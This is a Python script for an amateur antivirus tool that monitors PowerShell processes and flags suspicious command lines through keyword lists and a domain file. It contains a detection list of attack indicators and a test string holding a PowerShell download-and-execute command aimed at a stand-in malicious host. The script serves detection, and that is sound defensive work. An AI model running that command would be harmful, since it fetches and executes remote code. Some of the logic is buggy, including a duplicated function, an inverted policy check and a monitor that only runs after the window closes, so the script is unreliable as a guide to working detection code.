import psutil
import subprocess
import tkinter as tk

def is_suspicious(cmdline):
    # Convert the command line to lowercase for case-insensitive matching
    cmdline_lower = cmdline.lower()

    # Scans in known malicious domains into array
    known_mal_domains = "SimpleAnitVirus/scan_known_malware/malicious_domains.txt"
    with open(known_mal_domains, 'r') as file:
        malicious_domains = [line.strip() for line in file]

    # Suspicious keywords and phrases
    suspicious_keywords = ["Invoke-Expression", "Base64", "DownloadString"]
    for keyword in suspicious_keywords:
        if keyword.lower() in cmdline_lower:
            return True

    # Script block logging indicators
    if '{' in cmdline and '}' in cmdline:
        return True

    # Execution of unsigned scriptsp
    if "Set-ExecutionPolicy" in cmdline and "-Scope" in cmdline and "Unrestricted" not in cmdline:
        return True

    # Check for encoded commands (Base64 or other encoding)
    if "-encodedcommand" in cmdline_lower:
        return True

    # Detect attempts to hide the command with obfuscation techniques
    obfuscation_indicators = ["IEX", "Invoke-Expression"]
    for indicator in obfuscation_indicators:
        if indicator.lower() in cmdline_lower:
            return True

    # Network activity (e.g., downloading from suspicious URLs)
    if "-uri" in cmdline_lower and any(domain in cmdline_lower for domain in malicious_domains):
        return True

    # Suspicious parameters or arguments
    suspicious_parameters = ["-NoProfile", "-WindowStyle Hidden"]
    for param in suspicious_parameters:
        if param.lower() in cmdline_lower:
            return True

    # Contextual checks (e.g., execution from unusual locations)
    contextual_indicators = ["C:\\Temp\\", "Desktop\\"]
    for indicator in contextual_indicators:
        if indicator.lower() in cmdline_lower:
            return True

    # If none of the above criteria match, consider it not suspicious
    return False

def monitor_powershell():
    for process in psutil.process_iter(attrs=['pid', 'name', 'cmdline']):
        if 'powershell' in process.info['name'].lower():
            cmdline = ' '.join(process.info['cmdline'])
            if is_suspicious(cmdline):
                # Log or take action on the suspicious command
                print(f"Suspicious PowerShell Command Detected: {cmdline}")


# Define a test case with a suspicious PowerShell command
test_cmdline = "powershell.exe -command 'Invoke-Expression -Command \"IEX (New-Object Net.WebClient).DownloadString('http://malicious.com/malware.ps1')\"'"
# test_cmdline = "test"

# Test the is_suspicious function with the test_cmdline
if is_suspicious(test_cmdline):
    print("Test: Suspicious PowerShell Command Detected")
else:
    print("Test: No Suspicious PowerShell Command Detected")

def start_monitoring_code():
    # Use subprocess to run the anti_virus.py script
    subprocess.Popen(["python", "anti_virus.py"])

# Create a root window
root = tk.Tk()

# Create a button
start_monitoring_button = tk.Button(root, text="Start Monitoring")

# Define the start_monitoring_code function
def start_monitoring_code():
    print("Monitor is on")

# Configure the button widget with the text "Start Monitoring" to execute command when pressed
start_monitoring_button.configure(command=start_monitoring_code)
start_monitoring_button.pack()

# main loop of the tkinter application
root.mainloop()


# Example usage:
monitor_powershell()
